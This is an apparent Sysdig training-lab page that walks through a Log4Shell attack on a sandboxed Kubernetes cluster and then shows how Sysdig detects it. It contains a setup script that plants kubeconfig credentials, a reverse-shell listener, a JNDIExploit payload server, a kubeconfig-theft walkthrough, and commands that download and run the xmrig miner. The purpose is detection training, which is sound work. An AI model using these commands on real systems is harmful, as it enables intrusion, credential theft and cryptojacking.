---
title: "Simulate an attack"
chapter: false
weight: 2
---


```
#infra

set -xe

TIME=$(uptime -p | cut -d " " -f2-)
echo "TEAM_TRAINING_$0_${TIME}"

# Get track assets

git clone -b use_participant_id_cluster_name https://github.com/draios/instruqt-assets.git /tmp/instruqt-assets
cp -r /tmp/instruqt-assets/common/* /root/

# Enable bash completion for kubectl
echo "source /usr/share/bash-completion/bash_completion" >> /root/.bashrc
echo "complete -F __start_kubectl k" >> /root/.bashrc

# helm charts
helm repo add sysdig https://charts.sysdig.com
helm repo update

# Wait for the Instruqt host bootstrap to finish
until [ -f /opt/instruqt/bootstrap/host-bootstrap-completed ]
do
    sleep 1
done

# Wait for the Kubernetes API server to become available
while ! curl --silent --fail --output /dev/null http://localhost:8001/api
do
  sleep 1 
done


# #------------
# #audit
# cat << 'EOF' > k3s.new.service
# [Unit]
# Description=k3s Kubernetes cluster
# After=network-online.target rsyslog.service google-guest-agent.service
# Wants=network-online.target rsyslog.service
# After=cloud-final.service multi-user.target
# Wants=cloud-final.service
# [Service]
# Type=notify
# NotifyAccess=all
# EnvironmentFile=-/etc/default/%N
# EnvironmentFile=-/etc/sysconfig/%N
# EnvironmentFile=-/etc/systemd/system/k3s.service.env
# KillMode=control-group
# Delegate=yes
# # Having non-zero Limit*s causes performance problems due to accounting overhead
# # in the kernel. We recommend using cgroups to do container-local accounting.
# LimitNOFILE=1048576
# LimitNPROC=infinity
# LimitCORE=infinity
# TasksMax=infinity
# TimeoutStartSec=0
# Restart=always
# RestartSec=5s
# ExecStartPre=-/sbin/modprobe br_netfilter
# ExecStartPre=-/sbin/modprobe overlay
# ExecStart=/usr/local/bin/k3s \
#         server \
#         '--kube-apiserver-arg=audit-log-path=/var/lib/rancher/audit/audit.log' \
#         '--kube-apiserver-arg=audit-policy-file=/var/lib/rancher/audit/audit-policy.yaml' \
#         '--kube-apiserver-arg=audit-webhook-config-file=/var/lib/rancher/audit/webhook-config.yaml'
# EOF
# mkdir -p /var/lib/rancher/audit
# touch /var/lib/rancher/audit/audit.log
# chmod 777 /var/lib/rancher/audit/audit.log
# wget https://raw.githubusercontent.com/falcosecurity/contrib/main/examples/k8s_audit_config/audit-policy.yaml
# cp audit-policy.yaml /var/lib/rancher/audit/
# cat << EOF | sudo tee /var/lib/rancher/audit/webhook-config.yaml
# apiVersion: v1
# kind: Config
# clusters:
# - name: sysdig-training
#   cluster:
#     server: http://localhost:30007/k8s-audit
# contexts:
# - context:
#     cluster: sysdig-training
#     user: ""
#   name: default-context
# current-context: default-context
# preferences: {}
# users: []
# EOF
# cp /root/k3s.new.service /etc/systemd/system/k3s.service
# systemctl daemon-reload && systemctl restart k3s



#----------------
# create vulnerable deployment
cat <<-"EOF" > /root/manifest.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: accountportal
  name: accountportal
  namespace: accountportal
spec:
  replicas: 2
  selector:
    matchLabels:
      app: accountportal
  template:
    metadata:
      labels:
        app: accountportal
    spec:
      containers:
        - name: accountportal
          image: marcelsysdig/accountportal:latest
          ports:
            - containerPort: 8080
              protocol: TCP

---
apiVersion: v1
kind: Service
metadata:
  name: accountportal
  labels:
    app: accountportal
  namespace: accountportal
spec:
  selector:
    app: accountportal
  type: LoadBalancer
  externalIPs:
  - nodeipnode
  ports:
   - port: 8082
     targetPort: 8080
EOF

sed -i "s/nodeipnode/$(curl -s http://whatismyip.akamai.com/)/g" manifest.yaml


kubectl create ns accountportal
kubectl apply -f manifest.yaml -n accountportal

SERVER_IP=$(curl -s http://whatismyip.akamai.com/)
ATTACKER_IP=$(ssh -o StrictHostKeyChecking=no attacker "curl -s http://whatismyip.akamai.com/")


agent variable set SERVER_IP ${SERVER_IP}
agent variable set ATTACKER_IP ${ATTACKER_IP}
agent variable set SYSDIG_CLUSTER_ID "insq_${INSTRUQT_PARTICIPANT_ID}"


#prepare stolen credentials
kubectl wait pods -n accountportal --all --for=condition=Ready --timeout=5m

POD_NAME_1=$(kubectl get pods -n accountportal -l app=accountportal  --no-headers -o custom-columns=":metadata.name" | head -n 1)
POD_NAME_2=$(kubectl get pods -n accountportal -l app=accountportal  --no-headers -o custom-columns=":metadata.name" | tail -n 1)
cp /etc/rancher/k3s/k3s.yaml /etc/rancher/k3s/k3s.yaml.backup
sed -i 's=127.0.0.1=server=' /etc/rancher/k3s/k3s.yaml.backup
kubectl exec -n accountportal $POD_NAME_1 -- mkdir /tmp/secret
kubectl exec -n accountportal $POD_NAME_2 -- mkdir /tmp/secret
kubectl exec -n accountportal $POD_NAME_1 -- touch /flag
kubectl exec -n accountportal $POD_NAME_2 -- mkdir /flag
kubectl cp /etc/rancher/k3s/k3s.yaml.backup accountportal/$POD_NAME_1:/tmp/secret/k3s.yaml
kubectl cp /etc/rancher/k3s/k3s.yaml.backup accountportal/$POD_NAME_2:/tmp/secret/k3s.yaml

TIME=$(uptime -p | cut -d " " -f2-)
echo "TEAM_TRAINING_$0_${TIME}"

```

Execute the Attack
===

Before we execute the attack, we will bind `nc` to port 9001. We'll use this later for a reverse shell within the compromised application pod. From the `Attacker #1` tab, execute:

```
nc -lnvp 9001
```

On the `Attacker #2` tab, we'll launch an app that will respond to an LDAP query by log4j with a malicious payload.
```
java -jar /opt/log4shell/JNDIExploit-1.2-SNAPSHOT.jar -i [[ Instruqt-Var key="ATTACKER_IP" hostname="server" ]]
```

The last piece is to actually trigger the exploit via our vulnerable app's login form. Run a helper script on the `Attacker #3` tab to generate the malicious string we'll use.
```
get_log4shell_username
```

Highlight the outputted string from your terminal to copy it to your clipboard. Then paste it into to the username field on the [Vulnerable Web App](http://[[ Instruqt-Var key="SERVER_IP" hostname="server" ]]:8082/index.html).

Now the fun begins! We will confirm our exploit worked in the next section and see what we can exfiltrate from our target.

Steal credentials
===

From the `Attacker #1` tab, confirm you have an interactive shell by trying out some commands such as `ls` or `pwd`.

At this point, our workload is toast. Attackers may begin looking for sensitive files by common path, inspecting mounts, etc. They discovered
```
find . -name k3s.yaml
```

Now that you know the path, find the contents of that file via your shell.
<details>
<summary>Solution</summary>

```
cat ./tmp/secret/k3s.yaml
```

</details>

Copy the contents of the Kubeconfig file. Open the `Kubeconfig` tab, select the `/tmp/hacked_kubeconfig.yml` file from the left, and paste the contents into the code editor. Save the icon by clicking the "Save" icon in the tab.

Let's use this newly compromised Kubeconfig file and see what we can find on our target cluster.
```
export KUBECONFIG=/tmp/hacked_kubeconfig.yml
kubectl get pods --all-namespaces
kubectl get nodes
```

Feel free to try any other `kubectl` commands you may find interesting.


Install a cryptominer
===

Attackers determined they had enough access to `exec` into running pods, so they decided to try and profit from it. Let's try this for ourselves and grab a shell on one of the infrastructure pods.
```
kubectl exec -it -n kube-system deploy/traefik -- /bin/sh
```

We made it this far, so next we'll download, untar, and install and run the cryptominer:
```
wget -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```

Hmm. That didn't quite work, did it? See if you can find a way to download that file within the container's filesystem.

<details>
<summary>Hint</summary>

```
cd /tmp
wget -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```

</details>

Once you have the archive downloaded, let's extract it.
```
tar -xvf xmrig.tar.gz
```

Finally, launch xmrig to start mining some Monero.
```
while true; do ./xmrig-6.16.4/xmrig --donate-level 100 -o xmr-us-east1.nanopool.org:14433 -k -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background; sleep 20; done
```


View events in Sysdig Secure
===

Now that we successfully exploited log4shell in our sandbox environment, let's see what the Sysdig agent was able to observe. Here is a link to see [Sysdig events only for your cluster](https://us2.app.sysdig.com/secure/#/events?last=86400&scope=%5B%7B%22operand%22%3A%22kubernetes.cluster.name%22%2C%22operator%22%3A%22equals%22%2C%22value%22%3A%5B%22[[ Instruqt-Var key="SYSDIG_CLUSTER_ID" hostname="server" ]]%22%5D%7D%5D&severities=high%2Cmedium%2Clow).

What are policies that were triggered?

What could we have done differently to actually stop the attacker early on?
